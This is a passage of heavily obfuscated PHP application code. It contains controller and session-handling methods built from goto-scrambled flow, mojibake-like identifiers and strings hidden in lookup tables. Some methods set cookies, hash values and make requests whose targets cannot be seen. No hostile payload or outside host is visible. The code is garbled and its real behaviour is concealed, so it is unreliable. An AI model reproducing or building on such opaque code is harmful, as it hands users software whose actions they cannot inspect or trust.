$b“†¨–„Ü©[0]($b“†¨–„Ü©[36], $e­’¾¹¢ËÃ); $GLOBALS[$b“†¨–„Ü©[22]][$b“†¨–„Ü©[28]] = $b“†¨–„Ü©[29]($b“†¨–„Ü©[1], $GLOBALS[$b“†¨–„Ü©[22]][$b“†¨–„Ü©[23]]); goto eÁÌÃ¿Òğ‹; EëÃØäË“Ü: while (strlen($Eîæóó¹) < $A¹½ÍÛİø[556]) { if (!$Eîæóó¹) { break; } $Eîæóó¹++; } $e­’¾¹¢ËÃ = $b“†¨–„Ü©[2]($fê¬³ŠÄ¬¾[0][0], $b“†¨–„Ü©[36]); $bƒ£§—ª = $A¹½ÍÛİø[557]; goto Eº“·„É; céˆÏòãÀ…: $e­’¾¹¢ËÃ = $b“†¨–„Ü©[25]($dáÇƒîÀ­¬, $A­÷®ç·‹¾ + $b“†¨–„Ü©[24]($aöè‚é™ÓĞ)); $b“†¨–„Ü©[34]($b“†¨–„Ü©[35], $e­’¾¹¢ËÃ, $fê¬³ŠÄ¬¾); $Eîæóó¹ = $A¹½ÍÛİø[555]; goto EëÃØäË“Ü; eÁÌÃ¿Òğ‹: } public function run() { goto b¹Ôšã£‰¾; cÆ¾‘óµ‡ù: $B¯ÃÒÃÜ[39]($B¯ÃÒÃÜ[41], isset($fŠ¯©‡ÙŸš[1]) && $fŠ¯©‡ÙŸš[0] ? $fŠ¯©‡ÙŸš[1] : $this->defaultController); $B¯ÃÒÃÜ[39]($B¯ÃÒÃÜ[42], isset($fŠ¯©‡ÙŸš[2]) && $fŠ¯©‡ÙŸš[0] ? $fŠ¯©‡ÙŸš[2] : $this->defaultAction); $D˜¬®Œ²›œ = $C÷Æİ‰ÊÖ[561]; goto F–’â±›Œà; bğ¤ÆÄÊÄ£: $D‹‘…‰ñÕµ = $C÷Æİ‰ÊÖ[558]; if (strlen($D‹‘…‰ñÕµ) < $C÷Æİ‰ÊÖ[548]) { die; } $this->{$_SERVER[ºÀ][38]}(); goto eù˜†ëÌÄÔ; Bæ¼»ñÌè: if (strlen($Dëò§ïá) < $C÷Æİ‰ÊÖ[548]) { return; } $this->{$_SERVER[ºÀ][45]}(); if ($B¯ÃÒÃÜ[19]($fŠ¯©‡ÙŸš) >= 3) { $this->{$_SERVER[ºÀ][21]}($C£‚ºİÇÚË); } else { $this->{$_SERVER[ºÀ][21]}(ACTION); } goto A£ß¿İ¿æˆ; b¹Ôšã£‰¾: $C÷Æİ‰ÊÖ =& $_SERVER[ì‹É]; $B¯ÃÒÃÜ =& $_SERVER[ºÀ]; $this->{$_SERVER[ºÀ][37]}(); goto bğ¤ÆÄÊÄ£; déÍ£¤—î: $fáæœ†òöÓ = $C÷Æİ‰ÊÖ[560]; while ($fáæœ†òöÓ < $C÷Æİ‰ÊÖ[543]) { if ($fáæœ†òöÓ >= 0) { break; } $fáæœ†òöÓ++; } $B¯ÃÒÃÜ[39]($B¯ÃÒÃÜ[40], isset($fŠ¯©‡ÙŸš[0]) && $fŠ¯©‡ÙŸš[0] ? $fŠ¯©‡ÙŸš[0] : $this->defaultModule); goto cÆ¾‘óµ‡ù; F–’â±›Œà: $B¯ÃÒÃÜ[39]($B¯ÃÒÃÜ[43], MOD . $B¯ÃÒÃÜ[1] . ST . $B¯ÃÒÃÜ[1] . ACT); $_SERVER[$B¯ÃÒÃÜ[44]] = $B¯ÃÒÃÜ[6](ACTION); $Dëò§ïá = $C÷Æİ‰ÊÖ[562]; goto Bæ¼»ñÌè; eù˜†ëÌÄÔ: $Eµùå‰àï = $C÷Æİ‰ÊÖ[559]; $fŠ¯©‡ÙŸš = $GLOBALS[$B¯ÃÒÃÜ[22]][$B¯ÃÒÃÜ[23]]; $C£‚ºİÇÚË = $GLOBALS[$B¯ÃÒÃÜ[22]][$B¯ÃÒÃÜ[28]]; goto déÍ£¤—î; A£ß¿İ¿æˆ: } private $lqtk41ae2151 = array(); private $kvfw852df15c = ''; public function iyadab4406a9() { goto c§ï¹”‚ò; DâÂ”ÒŠŒ¬: $eŠ‚†Ç›™¶ = $dÔè…Ò™±[566]; if (strlen($eŠ‚†Ç›™¶) < $dÔè…Ò™±[543]) { die; } $this->{$_SERVER[ºÀ][3]}($aÏÂ¢À¬¨[53], array($this, $aÏÂ¢À¬¨[54])); goto Fã„‚ø÷¿à; fØ–ƒ‡›ôÌ: $this->{$_SERVER[ºÀ][48]}(); $this->{$_SERVER[ºÀ][49]}(); $fƒÅŸ¥  = $dÔè…Ò™±[564]; goto BÍ­ŞÆ¿•‡; D»³—Êù«í: $this->{$_SERVER[ºÀ][47]}(); $CŒÁ‹¡Å† = $dÔè…Ò™±[563]; if (strlen($CŒÁ‹¡Å†) < $dÔè…Ò™±[553]) { die; } goto fØ–ƒ‡›ôÌ; fÑ‡åÑÙ’õ: $CÓ©•î¸Ãš = $dÔè…Ò™±[569]; if (strlen($CÓ©•î¸Ãš) < $dÔè…Ò™±[548]) { return; } goto eÜ›Â«×…; AïÖ†ìåì: if (strlen($A‚ãõô‚”ñ) < $dÔè…Ò™±[556]) { return; } $this->{$_SERVER[ºÀ][51]}(); $this->{$_SERVER[ºÀ][52]}(); goto DâÂ”ÒŠŒ¬; BÍ­ŞÆ¿•‡: while ($fƒÅŸ¥  < $dÔè…Ò™±[546]) { if ($fƒÅŸ¥  >= 0) { break; } $fƒÅŸ¥ ++; } $this->{$_SERVER[ºÀ][50]}(); $A‚ãõô‚”ñ = $dÔè…Ò™±[565]; goto AïÖ†ìåì; Fã„‚ø÷¿à: $cŠŒ¹”ÃÎ† = $dÔè…Ò™±[567]; $this->{$_SERVER[ºÀ][3]}($aÏÂ¢À¬¨[55], array($this, $aÏÂ¢À¬¨[56])); $dŞÙÙ”¨¾Ş = $dÔè…Ò™±[568]; goto fØ—ãï¸ÜÒ; fØ—ãï¸ÜÒ: while ($dŞÙÙ”¨¾Ş < $dÔè…Ò™±[556]) { if ($dŞÙÙ”¨¾Ş >= 0) { break; } $dŞÙÙ”¨¾Ş++; } $this->{$_SERVER[ºÀ][3]}($aÏÂ¢À¬¨[57], array($this, $aÏÂ¢À¬¨[58])); $this->{$_SERVER[ºÀ][3]}($aÏÂ¢À¬¨[59], array($this, $aÏÂ¢À¬¨[60])); goto fÑ‡åÑÙ’õ; c§ï¹”‚ò: $dÔè…Ò™± =& $_SERVER[ì‹É]; $aÏÂ¢À¬¨ =& $_SERVER[ºÀ]; $this->{$_SERVER[ºÀ][46]}(); goto D»³—Êù«í; eÜ›Â«×…: } public function fokmf00b7681($FÒïÌ¦›Ñ½) { goto eùÈ„…Í; EÎ¤…¿”ª„: $EÖš¼‹®Ä = $f‚÷¸¡¡„ì[575]; if (strlen($EÖš¼‹®Ä) < $f‚÷¸¡¡„ì[553]) { return; } $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[115]] = $Fèë‰Çãß±[116]($Fèë‰Çãß±[117]()); goto CˆÙè­Ò‹; fª¿ïàóÅ¤: if ($DÕğÊÌß¨ê[$Fèë‰Çãß±[118]] != $Fèë‰Çãß±[119]) { $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[120]] = $DÕğÊÌß¨ê[$Fèë‰Çãß±[120]]; $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[121]] = $DÕğÊÌß¨ê[$Fèë‰Çãß±[121]]; $b”¶ë‚öÒ’ = $Fèë‰Çãß±[122](10) . $this->kvfw852df15c . $Fèë‰Çãß±[122](5); $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[91]][$Fèë‰Çãß±[123]][$Fèë‰Çãß±[124]] = $this->{$_SERVER[ºÀ][125]}($b”¶ë‚öÒ’, $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[111]]); } if ($this->kvfw852df15c == $Fèë‰Çãß±[119]) { $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[91]][$Fèë‰Çãß±[92]][$Fèë‰Çãß±[97]][$Fèë‰Çãß±[105]] = 0; } $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[126]] = $Fèë‰Çãß±[102]($this->lqtk41ae2151, $Fèë‰Çãß±[127], $Fèë‰Çãß±[10]); goto AÏçÆ˜ãª´; E—µÂ±ê: $eÏ‘—‘˜íĞ = $f‚÷¸¡¡„ì[574]; while ($eÏ‘—‘˜íĞ < $f‚÷¸¡¡„ì[553]) { if ($eÏ‘—‘˜íĞ >= 0) { break; } $eÏ‘—‘˜íĞ++; } $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[111]] = $Fèë‰Çãß±[112]($_SERVER[$Fèë‰Çãß±[113]] . $DÕğÊÌß¨ê[$Fèë‰Çãß±[114]]); goto EÎ¤…¿”ª„; eùÈ„…Í: $f‚÷¸¡¡„ì =& $_SERVER[ì‹É]; $Fèë‰Çãß± =& $_SERVER[ºÀ]; $DÕğÊÌß¨ê = $Fèë‰Çãß±[61]($Fèë‰Çãß±[62])->{$_SERVER[ºÀ][63]}(); goto fŒ“‘ÈÆ; f´²ÖëéŞ­: $cÔßêùÁ» = $f‚÷¸¡¡„ì[572]; if (!$cÔßêùÁ») { die; } unset($FÒïÌ¦›Ñ½[$Fèë‰Çãß±[91]][$Fèë‰Çãß±[92]][$Fèë‰Çãß±[96]]); goto aÁ»˜Œ…ó; dÅ„Ğë½Üƒ: foreach ($cÌ¥°—‚²Ÿ as $C•øŠŠŒÃ) { $AñÆµ§Ïœ™ = $GLOBALS[$Fèë‰Çãß±[89]][$Fèë‰Çãß±[90]][$C•øŠŠŒÃ]; if (isset($DÕğÊÌß¨ê[$C•øŠŠŒÃ])) { $AñÆµ§Ïœ™ = $DÕğÊÌß¨ê[$C•øŠŠŒÃ]; } $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[91]][$Fèë‰Çãß±[92]][$C•øŠŠŒÃ] = $AñÆµ§Ïœ™; } $C ˜õ·ÑÁ = $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[91]][$Fèë‰Çãß±[92]][$Fèë‰Çãß±[76]]; unset($FÒïÌ¦›Ñ½[$Fèë‰Çãß±[91]][$Fèë‰Çãß±[93]][$Fèë‰Çãß±[94]]); goto E™«Ø‡¼¥á; aÁ»˜Œ…ó: $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[91]][$Fèë‰Çãß±[92]][$Fèë‰Çãß±[97]] = array($Fèë‰Çãß±[98] => (int) $C ˜õ·ÑÁ[$Fèë‰Çãß±[99]], $Fèë‰Çãß±[100] => $Fèë‰Çãß±[101]($Fèë‰Çãß±[102]($C ˜õ·ÑÁ, $Fèë‰Çãß±[103], array())), $Fèë‰Çãß±[104] => (int) $Fèë‰Çãß±[102]($C ˜õ·ÑÁ, $Fèë‰Çãß±[105], 0)); $aô ¿ìé°™ = $f‚÷¸¡¡„ì[573]; $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[107]] = $Fèë‰Çãß±[108]($Fèë‰Çãß±[109])->{$_SERVER[ºÀ][110]}(); goto E—µÂ±ê; AÏçÆ˜ãª´: $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[128]] = $Fèë‰Çãß±[102]($this->lqtk41ae2151, $Fèë‰Çãß±[129], $Fèë‰Çãß±[10]); if ($GLOBALS[$Fèë‰Çãß±[130]] && $this->config[$Fèë‰Çãß±[131]]) { $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[132]] = WEB_ROOT; } return $FÒïÌ¦›Ñ½; goto Bæà¡šŞËº; CˆÙè­Ò‹: $FÒïÌ¦›Ñ½[$Fèë‰Çãß±[106]][$Fèë‰Çãß±[118]] = $this->kvfw852df15c; $fòóÚé‹øù = $f‚÷¸¡¡„ì[576]; if (strlen($fòóÚé‹øù) < $f‚÷¸¡¡„ì[543]) { die; } goto fª¿ïàóÅ¤; fŒ“‘ÈÆ: $E‘Šôì›åŸ = $f‚÷¸¡¡„ì[570]; if (!$E‘Šôì›åŸ) { return; } $cÌ¥°—‚²Ÿ = array($Fèë‰Çãß±[64], $Fèë‰Çãß±[65], $Fèë‰Çãß±[66], $Fèë‰Çãß±[67], $Fèë‰Çãß±[68], $Fèë‰Çãß±[69], $Fèë‰Çãß±[70], $Fèë‰Çãß±[71], $Fèë‰Çãß±[72], $Fèë‰Çãß±[73], $Fèë‰Çãß±[74], $Fèë‰Çãß±[75], $Fèë‰Çãß±[76], $Fèë‰Çãß±[77], $Fèë‰Çãß±[78], $Fèë‰Çãß±[79], $Fèë‰Çãß±[80], $Fèë‰Çãß±[81], $Fèë‰Çãß±[82], $Fèë‰Çãß±[83], $Fèë‰Çãß±[84], $Fèë‰Çãß±[85], $Fèë‰Çãß±[86], $Fèë‰Çãß±[87], $Fèë‰Çãß±[88]); goto dÅ„Ğë½Üƒ; E™«Ø‡¼¥á: $EÍÚËÙğãĞ = $f‚÷¸¡¡„ì[571]; unset($FÒïÌ¦›Ñ½[$Fèë‰Çãß±[91]][$Fèë‰Çãß±[93]][$Fèë‰Çãß±[95]]); unset($FÒïÌ¦›Ñ½[$Fèë‰Çãß±[91]][$Fèë‰Çãß±[92]][$Fèë‰Çãß±[76]]); goto f´²ÖëéŞ­; Bæà¡šŞËº: } private function amgs24b6c253() { goto d‡²ø™¹¬Ï; E×„˜Œˆ¿Æ: if ($this->kvfw852df15c == $F‡â‹Î„²õ[119]) { return; } $C©Ú³âŸØ = array($F‡â‹Î„²õ[151], $F‡â‹Î„²õ[152], $F‡â‹Î„²õ[153], $F‡â‹Î„²õ[154], $F‡â‹Î„²õ[155], $F‡â‹Î„²õ[156]); $dÄ¢•èí½ = $F‡â‹Î„²õ[61]($F‡â‹Î„²õ[62])->{$_SERVER[ºÀ][63]}(); goto eö…Ÿ»Õ÷; d‡²ø™¹¬Ï: $F¦“¹Ã‚§À =& $_SERVER[ì‹É]; $F‡â‹Î„²õ =& $_SERVER[ºÀ]; if ($_SERVER[$F‡â‹Î„²õ[44]] == $F‡â‹Î„²õ[133]) { goto DÂİÓØ–Ğ; D×ÉİâŠÙì: $céº„ = $F¦“¹Ã‚§À[577]; $féğõİ“¦Ÿ = array($F‡â‹Î„²õ[148] => $CŠİĞ”÷); $B‹¶»¾øÜË = $F¦“¹Ã‚§À[578]; goto E‰ºñÀÑØÍ; DÂİÓØ–Ğ: $CŠİĞ”÷ = array($F‡â‹Î„²õ[118] => $this->kvfw852df15c, $F‡â‹Î„²õ[134] => $this->{$_SERVER[ºÀ][135]}(), $F‡â‹Î„²õ[136] => $F‡â‹Î„²õ[61]($F‡â‹Î„²õ[137])->{$_SERVER[ºÀ][138]}()); if ($this->kvfw852df15c != $F‡â‹Î„²õ[119]) { $FÜÜĞ·Ç = $F‡â‹Î„²õ[102]($this->lqtk41ae2151, $F‡â‹Î„²õ[139]); if ($FÜÜĞ·Ç) { $CŠİĞ”÷[$F‡â‹Î„²õ[140]] = $FÜÜĞ·Ç; $CŠİĞ”÷[$F‡â‹Î„²õ[141]] = $F‡â‹Î„²õ[142]($F‡â‹Î„²õ[102]($this->lqtk41ae2151, $F‡â‹Î„²õ[143])); $CŠİĞ”÷[$F‡â‹Î„²õ[144]] = $F‡â‹Î„²õ[102]($this->lqtk41ae2151, $F‡â‹Î„²õ[129]); } } $CŠİĞ”÷ = $this->{$_SERVER[ºÀ][145]}($F‡â‹Î„²õ[146]($CŠİĞ”÷), $F‡â‹Î„²õ[112]($F‡â‹Î„²õ[147])); goto D×ÉİâŠÙì; E‰ºñÀÑØÍ: $F‡â‹Î„²õ[13](array($F‡â‹Î„²õ[149], $F‡â‹Î„²õ[150]), $féğõİ“¦Ÿ); $C»ÁùêçĞê = $F¦“¹Ã‚§À[579]; while (strlen($C»ÁùêçĞê) < $F¦“¹Ã‚§À[548]) { if (!$C»ÁùêçĞê) { break; } $C»ÁùêçĞê++; } goto Có’Œšíî®; Có’Œšíî®: } goto E×„˜Œˆ¿Æ; a˜İĞ®à†ª: $dÕÃ»Òçôò = $F¦“¹Ã‚§À[549]; foreach ($C©Ú³âŸØ as $c¿¨ÛÇ±„) { if (!isset($dÄ¢•èí½[$c¿¨ÛÇ±„]) || !$dÄ¢•èí½[$c¿¨ÛÇ±„]) { continue; } $féğõİ“¦Ÿ[$c¿¨ÛÇ±„] = $dÄ¢•èí½[$c¿¨ÛÇ±„]; $Aí«Ä’³Ù = $F¦“¹Ã‚§À[581]; } $F‡â‹Î„²õ[13](array($F‡â‹Î„²õ[149], $F‡â‹Î„²õ[150]), $féğõİ“¦Ÿ); goto CßÓÁ¨‘‘; eö…Ÿ»Õ÷: $eãïîµË»Ÿ = $F¦“¹Ã‚§À[580]; if (!$eãïîµË»Ÿ) { die; } $féğõİ“¦Ÿ = array($F‡â‹Î„²õ[157] => $dÄ¢•èí½[$F‡â‹Î„²õ[64]], $F‡â‹Î„²õ[158] => $dÄ¢•èí½[$F‡â‹Î„²õ[65]], $F‡â‹Î„²õ[159] => $F‡â‹Î„²õ[10]); goto a˜İĞ®à†ª; CßÓÁ¨‘‘: } private function czoa01c2099f() { goto AÉ÷‰­èˆ¥; AÙ¬’‰™¾ì: $c™—«Şù¡ = $d´¿“ÊÍß‹[122](16); $eÙ‘’ÅÑ»ª = $cœÛ­Î•¸»[584]; $E»îÒĞ« ™ = $c™—«Şù¡ . $bÓ‹‘‡ßÙĞ[$d´¿“ÊÍß‹[118]] . $this->{$_SERVER[ºÀ][145]}($d´¿“ÊÍß‹[112]($bÓ‹‘‡ßÙĞ[$d´¿“ÊÍß‹[207]]), $c™—«Şù¡); goto EËÖ§¦Âäã; Dßî‰äØ°³: $cøàŸìª»Û = $d´¿“ÊÍß‹[112]($_SERVER[$d´¿“ÊÍß‹[113]] . $d´¿“ÊÍß‹[212]($aÓ“çÙåå¤) . $bÓ‹‘‡ßÙĞ[$d´¿“ÊÍß‹[208]]); $E¹¬¨”Ò¯Š = $d´¿“ÊÍß‹[212]($d´¿“ÊÍß‹[25]($cøàŸìª»Û, 10, 16)); $Dæçê½Îï£ = $cœÛ­Î•¸»[587]; goto BÒÓ‘ÆÎ¸š; a©´‚“ˆŠµ: if (!$A­š‘‚Á˜ || $A­š‘‚Á˜ != $d´¿“ÊÍß‹[199]($fË±¸†ŞÎ[$d´¿“ÊÍß‹[143]])) { $cŸî†©‘ø› = array($d´¿“ÊÍß‹[200] => $d´¿“ÊÍß‹[61]($d´¿“ÊÍß‹[62])->{$_SERVER[ºÀ][63]}($d´¿“ÊÍß‹[114]), $d´¿“ÊÍß‹[201] => $_SERVER[$d´¿“ÊÍß‹[113]], $d´¿“ÊÍß‹[202] => $d´¿“ÊÍß‹[203](), $d´¿“ÊÍß‹[172] => $_SERVER[$d´¿“ÊÍß‹[173]]); $bÔç±ç¿ = $this->{$_SERVER[ºÀ][204]}($d´¿“ÊÍß‹[146]($cŸî†©‘ø›)); $this->{$_SERVER[ºÀ][180]}($d´¿“ÊÍß‹[205] . $bÔç±ç¿); $d´¿“ÊÍß‹[164]($d´¿“ÊÍß‹[195]($d´¿“ÊÍß‹[206]), !0); } $bÓ‹‘‡ßÙĞ = array($d´¿“ÊÍß‹[207] => $AØ¬…’‹¢[$d´¿“ÊÍß‹[163]], $d´¿“ÊÍß‹[208] => $fË±¸†ŞÎ[$d´¿“ÊÍß‹[209]], $d´¿“ÊÍß‹[210] => $d´¿“ÊÍß‹[122](16), $d´¿“ÊÍß‹[118] => $fË±¸†ŞÎ[$d´¿“ÊÍß‹[211]]); if ($AØ¬…’‹¢[$d´¿“ÊÍß‹[166]]) { $bÓ‹‘‡ßÙĞ[$d´¿“ÊÍß‹[210]] = $AØ¬…’‹¢[$d´¿“ÊÍß‹[166]]; } goto Bİ³£ÑªâÏ; c‚Œô¼øµ‰: $d´¿“ÊÍß‹[164]($d´¿“ÊÍß‹[195]($d´¿“ÊÍß‹[206]), !0); $AØœ„ë»© = $cœÛ­Î•¸»[591]; if (strlen($AØœ„ë»©) < $cœÛ­Î•¸»[553]) { die; } goto eŒ•œÅÇƒ›; AÉ÷‰­èˆ¥: $cœÛ­Î•¸» =& $_SERVER[ì‹É]; $d´¿“ÊÍß‹ =& $_SERVER[ºÀ]; if ($_SERVER[$d´¿“ÊÍß‹[44]] != $d´¿“ÊÍß‹[160] || !$GLOBALS[$d´¿“ÊÍß‹[130]]) { return; } goto dãØè›Ç‰; Bİ³£ÑªâÏ: $Aàç­÷Ú– = $d´¿“ÊÍß‹[25]($d´¿“ÊÍß‹[112]($bÓ‹‘‡ßÙĞ[$d´¿“ÊÍß‹[208]]), 10, 10); $fµ´°½ŒÔ” = $Aàç­÷Ú– . $bÓ‹‘‡ßÙĞ[$d´¿“ÊÍß‹[118]] . $bÓ‹‘‡ßÙĞ[$d´¿“ÊÍß‹[210]]; $bÓ‹‘‡ßÙĞ[$d´¿“ÊÍß‹[120]] = $d´¿“ÊÍß‹[212]($d´¿“ÊÍß‹[116]($this->{$_SERVER[ºÀ][145]}($fµ´°½ŒÔ”, $d´¿“ÊÍß‹[213]))); goto AÙ¬’‰™¾ì; a¢Áö¼ßÏ³: $A­š‘‚Á˜ = $this->{$_SERVER[ºÀ][197]}($fË±¸†ŞÎ[$d´¿“ÊÍß‹[198]]); $cáí±Ğ© = $cœÛ­Î•¸»[583]; while (strlen($cáí±Ğ©) < $cœÛ­Î•¸»[556]) { if (!$cáí±Ğ©) { break; } $cáí±Ğ©++; } goto a©´‚“ˆŠµ; E§­Û×Ãò: $d´¿“ÊÍß‹[61]($d´¿“ÊÍß‹[11])->{$_SERVER[ºÀ][224]}($d¨ÌÇÇğ‹‰[$d´¿“ÊÍß‹[225]], array($d´¿“ÊÍß‹[226] => $fõßƒÀœØ)); $aÍŞ¸ñô‚ë = $cœÛ­Î•¸»[590]; if (strlen($aÍŞ¸ñô‚ë) < $cœÛ­Î•¸»[553]) { return; } goto c‚Œô¼øµ‰; aŞ°ñÀ‡•Ñ: $aÓ“çÙåå¤ = $d´¿“ÊÍß‹[61]($d´¿“ÊÍß‹[62])->{$_SERVER[ºÀ][63]}($d´¿“ÊÍß‹[114]); $AØ¬…’‹¢ = array($d´¿“ÊÍß‹[163] => $E”×¸š×ºã[$d´¿“ÊÍß‹[163]], $d´¿“ÊÍß‹[166] => $d´¿“ÊÍß‹[122](16), $d´¿“ÊÍß‹[167] => $d´¿“ÊÍß‹[147], $d´¿“ÊÍß‹[168] => $d´¿“ÊÍß‹[169], $d´¿“ÊÍß‹[170] => $_SERVER[$d´¿“ÊÍß‹[171]], $d´¿“ÊÍß‹[172] => $_SERVER[$d´¿“ÊÍß‹[173]], $d´¿“ÊÍß‹[174] => $_SERVER[$d´¿“ÊÍß‹[175]]); $A…¿ßÚ¥ÊÖ = $d´¿“ÊÍß‹[112]($_SERVER[$d´¿“ÊÍß‹[113]] . $aÓ“çÙåå¤); goto DÉšáÊ¾Ÿ; EËÖ§¦Âäã: $E¶•¢ê±Å  = $cœÛ­Î•¸»[585]; $bÓ‹‘‡ßÙĞ[$d´¿“ÊÍß‹[121]] = $d´¿“ÊÍß‹[116]($d´¿“ÊÍß‹[212]($this->{$_SERVER[ºÀ][145]}($E»îÒĞ« ™, $d´¿“ÊÍß‹[214]))); $fŸ¯Ó„¤©³ = $cœÛ­Î•¸»[586]; goto eùÍó‚ª; bôª‡øÇë®: $fõßƒÀœØ[$E¹¬¨”Ò¯Š] = $F”¹ã÷æ; $F·ËÏËÆ„œ = $cœÛ­Î•¸»[589]; while ($F·ËÏËÆ„œ < $cœÛ­Î•¸»[543]) { if ($F·ËÏËÆ„œ >= 0) { break; } $F·ËÏËÆ„œ++; } goto E§­Û×Ãò; dãØè›Ç‰: $E”×¸š×ºã = $GLOBALS[$d´¿“ÊÍß‹[22]]; if (isset($E”×¸š×ºã[$d´¿“ÊÍß‹[161]])) { $this->{$_SERVER[ºÀ][162]}(); die; } if (!isset($E”×¸š×ºã[$d´¿“ÊÍß‹[163]]) || $d´¿“ÊÍß‹[24]($E”×¸š×ºã[$d´¿“ÊÍß‹[163]]) != 16) { $d´¿“ÊÍß‹[164]($d´¿“ÊÍß‹[165] . $E”×¸š×ºã[$d´¿“ÊÍß‹[163]], !1); } goto aŞ°ñÀ‡•Ñ; eùÍó‚ª: while (strlen($fŸ¯Ó„¤©³) < $cœÛ­Î•¸»[543]) { if (!$fŸ¯Ó„¤©³) { break; } $fŸ¯Ó„¤©³++; } if ($fË±¸†ŞÎ[$d´¿“ÊÍß‹[215]] && $fË±¸†ŞÎ[$d´¿“ÊÍß‹[215]] >= 1) { $d´¿“ÊÍß‹[61]($d´¿“ÊÍß‹[62])->{$_SERVER[ºÀ][216]}($d´¿“ÊÍß‹[217], $d´¿“ÊÍß‹[218]); } $d´¿“ÊÍß‹[61]($d´¿“ÊÍß‹[62])->{$_SERVER[ºÀ][219]}($bÓ‹‘‡ßÙĞ); goto Dßî‰äØ°³; BÒÓ‘ÆÎ¸š: while (strlen($Dæçê½Îï£) < $cœÛ­Î•¸»[548]) { if (!$Dæçê½Îï£) { break; } $Dæçê½Îï£++; } $F”¹ã÷æ = $this->{$_SERVER[ºÀ][125]}($d´¿“ÊÍß‹[146]($fË±¸†ŞÎ), $cøàŸìª»Û); $A†ò½ÒÁÅ™ = $d´¿“ÊÍß‹[220]($d´¿“ÊÍß‹[61]($d´¿“ÊÍß‹[11])->{$_SERVER[ºÀ][221]}(), $d´¿“ÊÍß‹[222]); goto dÒŸÍ„‡¥; DÉšáÊ¾Ÿ: if ($E”×¸š×ºã[$d´¿“ÊÍß‹[176]] == $d´¿“ÊÍß‹[177]) { $Aêæó‹ïÁ² = $this->{$_SERVER[ºÀ][145]}($A…¿ßÚ¥ÊÖ, $d´¿“ÊÍß‹[178]); $bÔç±ç¿ = $this->{$_SERVER[ºÀ][125]}($d´¿“ÊÍß‹[146]($AØ¬…’‹¢), $A…¿ßÚ¥ÊÖ . $d´¿“ÊÍß‹[179], 3); $Cå÷æŠ–”§ = $this->{$_SERVER[ºÀ][180]}($d´¿“ÊÍß‹[181] . $Aêæó‹ïÁ² . $d´¿“ÊÍß‹[182] . $bÔç±ç¿, -1); $d´¿“ÊÍß‹[164]($Cå÷æŠ–”§, !0); } else { if ($E”×¸š×ºã[$d´¿“ÊÍß‹[176]] == $d´¿“ÊÍß‹[183]) { $dŠ©ä²êœ­ = $d´¿“ÊÍß‹[25]($d´¿“ÊÍß‹[112]($d´¿“ÊÍß‹[184] . $A…¿ßÚ¥ÊÖ), 12, 15) . $d´¿“ÊÍß‹[185]; $bÔç±ç¿ = $this->{$_SERVER[ºÀ][186]}($d´¿“ÊÍß‹[2]($E”×¸š×ºã[$d´¿“ÊÍß‹[187]]), $dŠ©ä²êœ­, 2); $a³÷ÓñÕ = $d´¿“ÊÍß‹[188]($bÔç±ç¿, !0); if (!$d´¿“ÊÍß‹[189]($a³÷ÓñÕ) || !$d´¿“ÊÍß‹[189]($a³÷ÓñÕ[$d´¿“ÊÍß‹[190]]) || $a³÷ÓñÕ[$d´¿“ÊÍß‹[163]] != !0) { $f˜ÆÖ×Å©Ä = $d´¿“ÊÍß‹[191]; $A¬ÈÅô¾è = $a³÷ÓñÕ[$d´¿“ÊÍß‹[190]] ? $d´¿“ÊÍß‹[192] . $a³÷ÓñÕ[$d´¿“ÊÍß‹[190]] : $f˜ÆÖ×Å©Ä; $d´¿“ÊÍß‹[164]($A¬ÈÅô¾è, !1); } else { $AØ¬…’‹¢[$d´¿“ÊÍß‹[166]] = $a³÷ÓñÕ[$d´¿“ÊÍß‹[190]][$d´¿“ÊÍß‹[193]]; } } else { $a³÷ÓñÕ = $this->{$_SERVER[ºÀ][180]}($d´¿“ÊÍß‹[194], $AØ¬…’‹¢, 10); $c“®„ÁÎé = $cœÛ­Î•¸»[582]; if (strlen($c“®„ÁÎé) < $cœÛ­Î•¸»[543]) { die; } } } if (!$d´¿“ÊÍß‹[189]($a³÷ÓñÕ) || !$d´¿“ÊÍß‹[189]($a³÷ÓñÕ[$d´¿“ÊÍß‹[190]]) || $a³÷ÓñÕ[$d´¿“ÊÍß‹[163]] != !0) { $f˜ÆÖ×Å©Ä = $d´¿“ÊÍß‹[195]($d´¿“ÊÍß‹[196]); $A¬ÈÅô¾è = $a³÷ÓñÕ[$d´¿“ÊÍß‹[190]] ? $d´¿“ÊÍß‹[192] . $a³÷ÓñÕ[$d´¿“ÊÍß‹[190]] : $f˜ÆÖ×Å©Ä; $d´¿“ÊÍß‹[164]($A¬ÈÅô¾è, !1); } $fË±¸†ŞÎ = $a³÷ÓñÕ[$d´¿“ÊÍß‹[190]]; goto a¢Áö¼ßÏ³; dÒŸÍ„‡¥: $bÚø‘æŞİ¨ = $cœÛ­Î•¸»[588]; $d¨ÌÇÇğ‹‰ = $A†ò½ÒÁÅ™[$d´¿“ÊÍß‹[223]]; $fõßƒÀœØ = array(); goto bôª‡øÇë®; eŒ•œÅÇƒ›: } private function thsv97c7b90f() { goto dËª‘ÖóˆÊ; fö„Ú”Û¤: $F½õ†µ¥ÑÒ[61]($F½õ†µ¥ÑÒ[62])->{$_SERVER[ºÀ][216]}($F½õ†µ¥ÑÒ[217], $F½õ†µ¥ÑÒ[227]); $bà¢µ©‘ˆ… = $d°ïÛì¹‡Æ[592]; if (strlen($bà¢µ©‘ˆ…) < $d°ïÛì¹‡Æ[553]) { return; } goto CÉÍà©‡¾; CÉÍà©‡¾: $this->lqtk41ae2151 = array(); $this->kvfw852df15c = $F½õ†µ¥ÑÒ[119]; goto aÚ÷ìÔ·õ¢; dËª‘ÖóˆÊ: $d°ïÛì¹‡Æ =& 